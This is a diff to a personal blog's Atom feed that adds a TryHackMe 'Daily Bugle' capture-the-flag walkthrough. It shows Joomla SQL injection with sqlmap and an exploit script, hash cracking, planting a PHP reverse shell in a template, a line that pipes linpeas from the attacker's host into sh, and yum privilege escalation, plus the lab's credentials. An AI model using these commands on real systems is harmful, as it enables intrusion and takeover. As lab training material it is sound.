@@ -1,4 +1,226 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-16T17:29:34+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - Blue</title><link href="http://localhost:4000/tryhackme-blue/" rel="alternate" type="text/html" title="TryHackMe - Blue" /><published>2023-03-16T00:00:00+03:00</published><updated>2023-03-16T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-blue</id><content type="html" xml:base="http://localhost:4000/tryhackme-blue/"><![CDATA[<p><br /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-17T22:27:10+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - Daily Bugle</title><link href="http://localhost:4000/tryhackme-daily-bugle/" rel="alternate" type="text/html" title="TryHackMe - Daily Bugle" /><published>2023-03-17T00:00:00+03:00</published><updated>2023-03-17T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-daily-bugle</id><content type="html" xml:base="http://localhost:4000/tryhackme-daily-bugle/"><![CDATA[<p>Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges.</p>
+
+<p><br /></p>
+
+<h2 id="1-deploy">1. Deploy</h2>
+
+<p>Deploy the machine - it may take up to 2 minutes to configure.</p>
+
+<p><br /></p>
+
+<h3 id="11-access-the-web-server-who-robbed-the-bank">1.1 Access the web server, who robbed the bank?</h3>
+
+<p>As usual, let’s do a nmap scan first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.139.115
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/nmap.png" alt="nmap" /></p>
+
+<p>We found three open port. Theese are 22/tcp SSH, 80/tcp HTTP and 3306/tcp MYSQL.</p>
+
+<p>Let’s visit the homepage. Let’s see what we can find.</p>
+
+<p>We found the robber. It’s a spiderman.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/home.png" alt="home" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">spiderman</code></strong></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h2 id="2-obtain-user-and-root">2. Obtain User and Root</h2>
+
+<p>Hack into the machine and obtain the root user’s credentials.</p>
+
+<p><br /></p>
+
+<h3 id="21-what-is-the-joomla-version">2.1 What is the Joomla version?</h3>
+
+<p>Now, let’s do a gobuster scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.139.115/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/gobuster.png" alt="gobuster" /></p>
+
+<p>Let’s do a scan using joomscan to find the Joomla version.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ joomscan --url http://10.10.139.115/
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/joomscan.png" alt="joomscan" /></p>
+
+<p>We found the Joomla version. It is 3.7.0.</p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">3.7.0</code></strong></p>
+
+<p><br /></p>
+
+<p><em>Instead of using SQLMap, why not use a python script!</em></p>
+
+<h3 id="22-what-is-jonahs-cracked-password">2.2 What is Jonah’s cracked password?</h3>
+
+<p>With the Joomla version we found, we now search in exploit-db and see if we can find anything.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/search.png" alt="search" /></p>
+
+<p>Yes, we found the vulnerability. <a href="https://www.exploit-db.com/exploits/42033">CVE-2017-8917</a>.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/db.png" alt="db" /></p>
+
+<p>You can progress using <strong><code class="language-plaintext highlighter-rouge">sqlmap</code></strong> here, but I will use a python script written for faster results. Still below is the code for sqlmap</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/sql.png" alt="sql" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u "http://10.10.139.115/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/sqlmap.png" alt="sqlmap" /></p>
+
+<p>I will use the python script <a href="https://github.com/stefanlucas/Exploit-Joomla">here</a>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
+$ python joomblah http://10.10.139.115/
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/joomblah.png" alt="joomblah" /></p>
+
+<p>We found this hash code for Jonah’s password.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
+</code></pre></div></div>
+
+<p>Let’s crack this hash.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.hash
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/john.png" alt="john" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">spiderman123</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="23-what-is-the-user-flag">2.3 What is the user flag?</h3>
+
+<p>Go to the administrator directory and login with <strong><code class="language-plaintext highlighter-rouge">jonah:spiderman123</code></strong></p>
+
+<p>We are looking for a suitable place for any reverse shell. We go to where the .php pages are located.</p>
+
+<p>First, we click on <strong><code class="language-plaintext highlighter-rouge">Templates</code></strong> from the left sidebar.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/step1.png" alt="step1" /></p>
+
+<p>Then we click on <strong><code class="language-plaintext highlighter-rouge">Templates</code></strong>  again on the page we go to.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/step2.png" alt="step2" /></p>
+
+<p>Then we click on <strong><code class="language-plaintext highlighter-rouge">Beez3 Details and Files</code></strong>.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/step3.png" alt="step3" /></p>
+
+<p>And we have reached the source files, and from here we can put our reverse shell in the index.php file.
+You can find the reverse shell <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">here</a>.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/step4.png" alt="step4" /></p>
+
+<p>Don’t forget to change this.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/change.png" alt="change" /></p>
+
+<p>Now, we modify the contents of index.php.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/index.png" alt="index" /></p>
+
+<p>We set up a netcat listener before opening the index.php page.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
+</code></pre></div></div>
+
+<p>Now browse <a href="http://10.10.139.115/templates/beez3/index.php">http://10.10.139.115/templates/beez3/index.php</a> and you should get a reverse shell.</p>
+
+<p>And we are inside.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/in.png" alt="in" /></p>
+
+<p>The first thing on the server was to list the /home directory and find users.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/ls.png" alt="ls" /></p>
+
+<p>I tried to enter the jjameson directory but it didn’t work. So I decided to download <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230312">linpeas.sh</a> and run it on the target machine.</p>
+
+<p>First I set up my own machine. I am running the following code in the directory where the linpeas.sh file is located.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo python -m http.server 80
+</code></pre></div></div>
+
+<p>Then I run the following code on the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl 10.8.86.168/linpeas.sh | sh 
+</code></pre></div></div>
+
+<p>And it worked, let’s see what we find.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/run.png" alt="run" /></p>
+
+<p>We found a password but I have no idea what password it is.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/pass.png" alt="pass" /></p>
+
+<p>Let’s try it for jjameson.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/jj.png" alt="jj" /></p>
+
+<p>We also found the jjameson password<strong><code class="language-plaintext highlighter-rouge">(nv5uz9r3ZEDzVjNu)</code></strong></p>
+
+<p>Now we can go to the jjameson directory and get the user flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /home/jjameson
+$ ls -la
+$ cat user.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/user.png" alt="user" /></p>
+
+<p><br /></p>
+
+<h3 id="24-what-is-the-root-flag">2.4 What is the root flag?</h3>
+
+<p>Now, I check by doing <code class="language-plaintext highlighter-rouge">sudo -l</code>.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/yum.png" alt="yum" /></p>
+
+<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/yum/">gftobins</a> to get root privileges using yum.</p>
+
+<p>And let’s try this.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/gtfobins.png" alt="gtfobins" /></p>
+
+<p>Yes, it worked.</p>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/privesc.png" alt="privesc" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /root
+$ ls -la
+$ cat root.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/daily-bugle/root.png" alt="root" /></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="sqli," /><category term="yum," /><category term="joomla" /><summary type="html"><![CDATA[Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/daily-bugle.png" /><media:content medium="image" url="http://localhost:4000/assets/img/daily-bugle.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Blue</title><link href="http://localhost:4000/tryhackme-blue/" rel="alternate" type="text/html" title="TryHackMe - Blue" /><published>2023-03-16T00:00:00+03:00</published><updated>2023-03-16T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-blue</id><content type="html" xml:base="http://localhost:4000/tryhackme-blue/"><![CDATA[<p><br /></p>
 
 <h2 id="1-recon">1. Recon</h2>
 
